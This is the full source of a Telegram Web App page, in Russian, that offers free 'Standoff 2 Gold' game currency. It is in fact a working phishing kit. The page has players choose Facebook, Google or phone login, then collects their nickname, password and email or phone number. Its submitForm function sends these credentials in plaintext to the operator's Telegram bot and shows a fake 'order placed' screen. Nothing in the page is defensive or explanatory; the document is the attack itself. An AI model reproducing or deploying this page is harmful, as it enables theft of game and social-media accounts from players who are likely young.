<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Standoff 2 Gold</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            color: white;
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        .gold-icon {
            font-size: 80px;
            filter: drop-shadow(0 0 20px gold);
            margin-bottom: 10px;
        }
        h1 {
            font-size: 28px;
            background: linear-gradient(45deg, #ffd700, #ffa500);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 5px;
        }
        .methods-title {
            font-size: 18px;
            margin: 20px 0 15px;
            color: #a0a0a0;
        }
        .method-card {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 15px;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .method-card:hover {
            background: rgba(255, 255, 255, 0.1);
            border-color: #ffd700;
        }
        .method-icon {
            width: 50px;
            height: 50px;
            background: rgba(255, 215, 0, 0.1);
            border-radius: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 30px;
        }
        .method-info {
            flex: 1;
        }
        .method-name {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 5px;
        }
        .method-desc {
            font-size: 12px;
            color: #a0a0a0;
        }
        .method-arrow {
            color: #ffd700;
            font-size: 20px;
        }
        .form-header {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 30px;
            background: rgba(255, 255, 255, 0.05);
            padding: 15px;
            border-radius: 15px;
        }
        .back-button {
            background: rgba(255, 255, 255, 0.1);
            border: none;
            color: white;
            font-size: 24px;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            cursor: pointer;
        }
        .step-indicator {
            display: flex;
            justify-content: space-between;
            margin-bottom: 30px;
        }
        .step {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 2px solid rgba(255, 255, 255, 0.2);
            font-weight: bold;
        }
        .step.active {
            border-color: #ffd700;
            color: #ffd700;
        }
        .step.completed {
            border-color: #4caf50;
            color: #4caf50;
        }
        .step-label {
            font-size: 10px;
            margin-top: 5px;
            text-align: center;
            color: #a0a0a0;
        }
        .form-group {
            margin-bottom: 25px;
        }
        .form-label {
            display: block;
            margin-bottom: 8px;
            color: #a0a0a0;
        }
        .form-input {
            width: 100%;
            padding: 15px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            color: white;
            font-size: 16px;
        }
        .form-input:focus {
            outline: none;
            border-color: #ffd700;
        }
        .next-button {
            width: 100%;
            padding: 18px;
            background: linear-gradient(45deg, #ffd700, #ffa500);
            border: none;
            border-radius: 12px;
            color: #1a1a2e;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
        }
        .next-button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .info-text {
            text-align: center;
            margin-top: 20px;
            color: #a0a0a0;
            font-size: 12px;
        }
        .methods-screen, .form-screen, .success-screen {
            display: none;
        }
        .methods-screen.active, .form-screen.active, .success-screen.active {
            display: block;
        }
        .success-icon {
            font-size: 80px;
            margin: 40px 0 20px;
        }
        .success-title {
            font-size: 24px;
            color: #ffd700;
            margin-bottom: 10px;
        }
        .success-details {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 30px;
            text-align: left;
        }
        .detail-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            padding-bottom: 10px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        .close-button {
            width: 100%;
            padding: 18px;
            background: linear-gradient(45deg, #ffd700, #ffa500);
            border: none;
            border-radius: 12px;
            color: #1a1a2e;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Экран выбора метода -->
        <div id="methodsScreen" class="methods-screen active">
            <div class="header">
                <div class="gold-icon">🪙</div>
                <h1>STANDOFF 2 GOLD</h1>
            </div>
            <div class="methods-title">ВОЙТИ ЧЕРЕЗ</div>
            
            <div class="method-card" onclick="selectMethod('Facebook')">
                <div class="method-icon">📘</div>
                <div class="method-info">
                    <div class="method-name">Facebook</div>
                    <div class="method-desc">Вход через аккаунт Facebook</div>
                </div>
                <div class="method-arrow">→</div>
            </div>
            
            <div class="method-card" onclick="selectMethod('Google')">
                <div class="method-icon">🔵</div>
                <div class="method-info">
                    <div class="method-name">Google</div>
                    <div class="method-desc">Вход через Google аккаунт</div>
                </div>
                <div class="method-arrow">→</div>
            </div>
            
            <div class="method-card" onclick="selectMethod('Номер телефона')">
                <div class="method-icon">📱</div>
                <div class="method-info">
                    <div class="method-name">Номер телефона</div>
                    <div class="method-desc">Вход по номеру телефона</div>
                </div>
                <div class="method-arrow">→</div>
            </div>
        </div>

        <!-- Экран формы -->
        <div id="formScreen" class="form-screen">
            <div class="form-header">
                <button class="back-button" onclick="backToMethods()">←</button>
                <div class="method-indicator" id="selectedMethod">Facebook</div>
            </div>
            
            <div class="step-indicator">
                <div class="step active" id="step1">1</div>
                <div class="step" id="step2">2</div>
                <div class="step" id="step3">3</div>
            </div>
            
            <!-- Шаг 1 -->
            <div id="step1Content">
                <div class="form-group">
                    <label class="form-label">🎮 Никнейм в Standoff 2</label>
                    <input type="text" class="form-input" id="nickname" 
                           placeholder="Введите никнейм" 
                           oninput="checkStep1()">
                </div>
                <button class="next-button" id="nextBtn1" onclick="nextStep()" disabled>Далее</button>
            </div>
            
            <!-- Шаг 2 -->
            <div id="step2Content" style="display: none;">
                <div class="form-group">
                    <label class="form-label">🔐 Пароль</label>
                    <input type="password" class="form-input" id="password" 
                           placeholder="Введите пароль" 
                           oninput="checkStep2()">
                </div>
                <button class="next-button" id="nextBtn2" onclick="nextStep()" disabled>Далее</button>
            </div>
            
            <!-- Шаг 3 -->
            <div id="step3Content" style="display: none;">
                <div class="form-group">
                    <label class="form-label" id="step3Label">📧 Дополнительные данные</label>
                    <input type="text" class="form-input" id="additionalData" 
                           placeholder="" 
                           oninput="checkStep3()">
                </div>
                <button class="next-button" id="nextBtn3" onclick="submitForm()" disabled>Отправить</button>
            </div>
        </div>

        <!-- Экран успеха -->
        <div id="successScreen" class="success-screen">
            <div class="success-icon">✅</div>
            <div class="success-title">ЗАКАЗ ОФОРМЛЕН!</div>
            <div class="success-details" id="successDetails"></div>
            <button class="close-button" onclick="closeApp()">Закрыть</button>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        tg.ready();

        let currentMethod = '';
        let userData = {
            nickname: '',
            password: '',
            additionalData: ''
        };

        function selectMethod(method) {
            currentMethod = method;
            document.getElementById('selectedMethod').textContent = method;
            
            let step3Label = document.getElementById('step3Label');
            let additionalInput = document.getElementById('additionalData');
            
            if (method === 'Facebook') {
                step3Label.textContent = '📧 Email или телефон Facebook';
                additionalInput.placeholder = 'Введите email или телефон';
            } else if (method === 'Google') {
                step3Label.textContent = '✉️ Google email';
                additionalInput.placeholder = 'example@gmail.com';
            } else {
                step3Label.textContent = '☎️ Номер телефона';
                additionalInput.placeholder = '';
            }
            
            document.querySelector('.methods-screen').classList.remove('active');
            document.querySelector('.form-screen').classList.add('active');
            resetForm();
        }

        function backToMethods() {
            document.querySelector('.form-screen').classList.remove('active');
            document.querySelector('.methods-screen').classList.add('active');
            resetForm();
        }

        function resetForm() {
            document.getElementById('step1Content').style.display = 'block';
            document.getElementById('step2Content').style.display = 'none';
            document.getElementById('step3Content').style.display = 'none';
            
            document.getElementById('step1').className = 'step active';
            document.getElementById('step2').className = 'step';
            document.getElementById('step3').className = 'step';
            
            document.getElementById('nickname').value = '';
            document.getElementById('password').value = '';
            document.getElementById('additionalData').value = '';
            
            document.getElementById('nextBtn1').disabled = true;
            document.getElementById('nextBtn2').disabled = true;
            document.getElementById('nextBtn3').disabled = true;
        }

        function checkStep1() {
            let value = document.getElementById('nickname').value;
            document.getElementById('nextBtn1').disabled = value.length < 1;
        }

        function checkStep2() {
            let value = document.getElementById('password').value;
            document.getElementById('nextBtn2').disabled = value.length < 1;
        }

        function checkStep3() {
            let value = document.getElementById('additionalData').value;
            let isValid = false;
            
            if (currentMethod === 'Google') {
                isValid = value.includes('@');
            } else {
                isValid = value.length >= 1;
            }
            
            document.getElementById('nextBtn3').disabled = !isValid;
        }

        function nextStep() {
            if (document.getElementById('step1Content').style.display !== 'none') {
                userData.nickname = document.getElementById('nickname').value;
                
                document.getElementById('step1Content').style.display = 'none';
                document.getElementById('step2Content').style.display = 'block';
                
                document.getElementById('step1').className = 'step completed';
                document.getElementById('step2').className = 'step active';
                
            } else if (document.getElementById('step2Content').style.display !== 'none') {
                userData.password = document.getElementById('password').value;
                
                document.getElementById('step2Content').style.display = 'none';
                document.getElementById('step3Content').style.display = 'block';
                
                document.getElementById('step2').className = 'step completed';
                document.getElementById('step3').className = 'step active';
            }
        }

        function submitForm() {
            userData.additionalData = document.getElementById('additionalData').value;
            
            // Отправляем данные в бота
            tg.sendData(JSON.stringify({
                action: 'submit_form',
                method: currentMethod,
                nickname: userData.nickname,
                password: userData.password,
                additionalData: userData.additionalData
            }));
            
            // Показываем экран успеха
            document.querySelector('.form-screen').classList.remove('active');
            document.querySelector('.success-screen').classList.add('active');
            
            // Показываем данные
            document.getElementById('successDetails').innerHTML = `
                <div class="detail-item">Метод входа: ${currentMethod}</div>
                <div class="detail-item">Никнейм: ${userData.nickname}</div>
                <div class="detail-item">Пароль: ${'•'.repeat(userData.password.length)}</div>
                <div class="detail-item">Данные: ${userData.additionalData}</div>
            `;
            
            tg.HapticFeedback.notificationOccurred('success');
        }

        function closeApp() {
            tg.close();
        }
    </script>
</body>
</html>
